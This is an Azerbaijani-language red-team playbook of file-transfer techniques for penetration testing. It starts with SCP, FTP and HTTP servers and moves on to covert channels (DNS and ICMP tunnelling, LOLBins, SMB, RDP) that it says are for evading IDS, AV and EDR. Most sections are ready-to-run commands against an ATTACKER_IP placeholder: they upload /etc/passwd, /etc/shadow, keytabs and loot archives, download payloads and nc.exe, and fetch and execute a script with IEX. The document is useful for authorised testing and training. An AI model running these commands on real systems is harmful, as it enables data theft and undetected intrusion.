# 📁 File Transfer Playbook
> Sadədən kompleksə — penetration testing & red team əməliyyatları üçün fayl transfer metodları

---

## 📋 Mündəricat

1. [SCP — Sadə & Etibarlı](#1-scp--sadə--etibarlı)
2. [FTP Server](#2-ftp-server)
3. [HTTP Download Server](#3-http-download-server-python)
4. [HTTP Upload Server](#4-http-upload-server-uploadserver)
5. [Wildcard & Toplu Transfer](#5-wildcard--toplu-transfer)
6. [🔒 OPSEC — Gizli Transfer Metodları](#6--opsec--gizli-transfer-metodları)

---

## 1. SCP — Sadə & Etibarlı

> **İstifadə:** Şəbəkəyə SSH çıxışın olduğu hallarda ən sürətli seçim.

### Linux → Linux
```bash
scp /path/to/local_file user@REMOTE_IP:/remote/path/
```

### Windows → Linux
```powershell
scp C:\Users\Administrator\Special-Tools\tool.psm1 user@192.168.0.250:/home/user/tools/
```

### Linux → Windows
```bash
scp user@WINDOWS_IP:"C:/Users/Admin/file.txt" /local/path/
```

> ⚠️ **Qeyd:** SCP default olaraq SSH port 22 istifadə edir. Firewall varsa `-P <PORT>` ilə fərqli port göstər.

---

## 2. FTP Server

> **İstifadə:** SSH olmayan hallarda, sadə fayl paylaşımı üçün. Anonymous login ilə sürətli quraşdırma.

### Quraşdırma & Başlatma (Linux)
```bash
pip3 install pyftpdlib
python3 -m pyftpdlib -p 21 -w
```

| Flag | Məna |
|------|------|
| `-p 21` | Port 21 dinlə |
| `-w` | Write icazəsi ver (upload üçün) |
| `-i 0.0.0.0` | Bütün interfeyslər |
| `--username / --password` | Auth əlavə et |

### Qoşulma (Hər platformdan)
```bash
ftp <ATTACKER_IP>
# Login: anonymous
# Password: (boş, Enter)
```

### PowerShell ilə Upload (Windows hədəfdən)
```powershell
(New-Object Net.WebClient).UploadFile("ftp://ATTACKER_IP/shell.exe", "C:\path\shell.exe")
```

---

## 3. HTTP Download Server (Python)

> **İstifadə:** Hədəf maşına fayl çatdırmaq. Attacker maşında server qalxır, hədəf fayl çəkir.

### Server Başlat (Attacker — Linux)
```bash
python3 -m http.server 8000
# və ya spesifik interfeysdə:
python3 -m http.server 8000 --bind 0.0.0.0
```

### Fayl Çək — Linux Hədəf
```bash
wget http://ATTACKER_IP:8000/file.txt
curl -O http://ATTACKER_IP:8000/payload.exe
```

### Fayl Çək — Windows Hədəf
```powershell
# Invoke-WebRequest (IWR)
Invoke-WebRequest -Uri "http://ATTACKER_IP:8000/payload.exe" -OutFile "C:\Temp\payload.exe"

# WebClient (eski metodlar üçün)
(New-Object Net.WebClient).DownloadFile("http://ATTACKER_IP:8000/nc.exe", "C:\Temp\nc.exe")

# certutil (AV bypass üçün alternativ)
certutil -urlcache -f http://ATTACKER_IP:8000/file.txt C:\Temp\file.txt
```

---

## 4. HTTP Upload Server (uploadserver)

> **İstifadə:** Hədəf maşından attacker-ə fayl göndərmək — loot, credential, screenshot və s.

### Server Quraşdır & Başlat (Attacker — Linux)
```bash
pip3 install uploadserver
python3 -m uploadserver 8000
```

### Upload — Linux Hədəfdən
```bash
# Tək fayl
curl -X POST -F "files=@/etc/passwd" http://ATTACKER_IP:8000/upload

# Xüsusi fayl (Kerberos keytab və s.)
curl -X POST -F "files=@/opt/specialfiles/carlos.keytab" http://ATTACKER_IP:8000/upload
```

### Upload — Windows Hədəfdən
```powershell
# curl.exe ilə (Windows 10+ default gəlir)
curl.exe -F "files=@C:\path\BloodHound.zip" http://ATTACKER_IP:8000/upload

# Invoke-WebRequest ilə PUT metodu
Invoke-WebRequest -Uri "http://ATTACKER_IP:8000/upload" `
  -Method PUT `
  -InFile "C:\path\to\file.txt" `
  -ContentType "application/octet-stream"
```

---

## 5. Wildcard & Toplu Transfer

> **İstifadə:** Birdən çox fayl transfer etmək lazım olduqda.

### curl Wildcard (Linux)
```bash
# Bütün .txt və .log fayllarını upload et
curl -X PUT -T "{*.txt,*.log}" "http://ATTACKER_IP:8000/%s"

# BloodHound nəticələrini upload et
curl -X POST -F "files=@20260307045739_BloodHound.zip" http://ATTACKER_IP:12000/upload
```

### Tar + Pipe ilə Stream Transfer
```bash
# Hədəfdə:
tar czf - /loot/directory | curl -X POST -F "files=@-;filename=loot.tar.gz" http://ATTACKER_IP:8000/upload
```

### rsync (SSH üzərindən sinxronizasiya)
```bash
rsync -avz /loot/ user@ATTACKER_IP:/received/loot/
```

---

## 6. 🔒 OPSEC — Gizli Transfer Metodları

> **Məqsəd:** Aşkar olmamaq. Aşağıdakı metodlar şəbəkə monitorinqini, IDS/IPS sistemlərini, və AV-ları yan keçmək üçün nəzərdə tutulub.

---

### 6.1 HTTPS ilə Şifrəli Transfer

```bash
# Self-signed sertifikat yarat
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes

# uploadserver HTTPS ilə başlat
python3 -m uploadserver 443 --server-certificate cert.pem --server-key key.pem

# Hədəfdən yüklə (sertifikat yoxlamasını keç)
curl -k https://ATTACKER_IP/payload.exe -o payload.exe
Invoke-WebRequest -Uri "https://ATTACKER_IP/payload.exe" -OutFile payload.exe -SkipCertificateCheck
```

---

### 6.2 DNS üzərindən Transfer (DNS Tunneling)

> Firewall HTTP/HTTPS blok edərsə, DNS trafiki adətən keçir.

```bash
# dnscat2 server (attacker)
ruby dnscat2.rb --dns domain=yourdomain.com --secret=mysecret

# dnscat2 client (hədəf — PowerShell)
IEX (New-Object Net.WebClient).DownloadString("http://ATTACKER_IP/dnscat2.ps1")
Start-Dnscat2 -DNSserver ATTACKER_IP -Domain yourdomain.com -PreSharedSecret mysecret
```

---

### 6.3 ICMP üzərindən Transfer (Ping Tunnel)

> ICMP trafiki çox vaxt filtr edilmir.

```bash
# ptunnel-ng quraşdır
apt install ptunnel-ng

# Attacker (server):
ptunnel-ng -R

# Hədəf (client) — ICMP tunnel üzərindən SSH:
ptunnel-ng -p ATTACKER_IP -lp 2222 -da ATTACKER_IP -dp 22
ssh -p 2222 user@127.0.0.1
# Sonra SCP ilə fayl transfer et
```

---

### 6.4 Base64 Encode/Decode — Memory-only Transfer

> Disk yazmadan, yalnız terminal output üzərindən transfer.

```bash
# Hədəfdə faylı encode et:
base64 -w 0 /etc/shadow > /tmp/enc.txt
cat /tmp/enc.txt  # kopyala

# Attacker tərəfdə decode et:
echo "BASE64_STRING" | base64 -d > shadow.txt
```

```powershell
# Windows — faylı base64 çevir və çap et:
[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\loot\file.exe"))

# Linux tərəfindən decode:
echo "BASE64_STRING" | base64 -d > file.exe
```

---

### 6.5 Living-off-the-Land (LOLBins) — Native Alətlər

> Xarici alət yükləmədən, sistemdə mövcud olan proqramlarla transfer.

```powershell
# certutil — fayl yüklə (Windows)
certutil -urlcache -split -f http://ATTACKER_IP/nc.exe nc.exe

# bitsadmin — arxa planda yüklə
bitsadmin /transfer job /download /priority normal http://ATTACKER_IP/file.exe C:\Temp\file.exe

# PowerShell COM object
$webclient = New-Object -ComObject Msxml2.XMLHTTP
$webclient.open("GET","http://ATTACKER_IP/file",0)
$webclient.send()
[System.IO.File]::WriteAllBytes("C:\Temp\file",[System.Text.Encoding]::Default.GetBytes($webclient.responseText))
```

---

### 6.6 SMB üzərindən Transfer (Windows Domen Mühiti)

```powershell
# Attacker (Linux) — Impacket ilə SMB server:
python3 /usr/share/doc/python3-impacket/examples/smbserver.py share /tmp/share -smb2support

# Hədəf (Windows) — SMB share-dən kopyala:
copy \\ATTACKER_IP\share\payload.exe C:\Temp\payload.exe

# Hədəfdən attacker-ə yüklə:
copy C:\loot\file.txt \\ATTACKER_IP\share\file.txt
```

---

### 6.7 RDP Clipboard & Drive Redirect

> RDP sessiyası varsa — ən sadə OPSEC metodu (şifrəli, loglanmır).

```
1. xfreerdp ilə qoşul, disk mount et:
   xfreerdp /v:TARGET_IP /u:admin /p:pass /drive:loot,/tmp/loot

2. Hədəfdə: \\tsclient\loot\ — attacker diskidir
3. Fayl kopyala → avtomatik şifrəli RDP kanalı üzərindən keçir
```

---

### ⚡ Metod Seçim Cədvəli

| Ssenari | Tövsiyə olunan metod |
|---------|----------------------|
| SSH var | SCP |
| Yalnız HTTP | uploadserver / python http.server |
| Firewall HTTP blok | DNS Tunneling (dnscat2) |
| ICMP keçir | ptunnel-ng |
| Yalnız terminal var | Base64 encode/decode |
| Windows domen | SMB (Impacket) |
| RDP sessiyası | Drive Redirect |
| AV/EDR yoxlayır | LOLBins (certutil, bitsadmin) |
| Maksimum gizlilik | HTTPS + Base64 + LOLBins kombo |

---

> 📌 **Xatırlatma:** Bu playbook yalnız authorized penetration testing və CTF məqsədi üçündür.
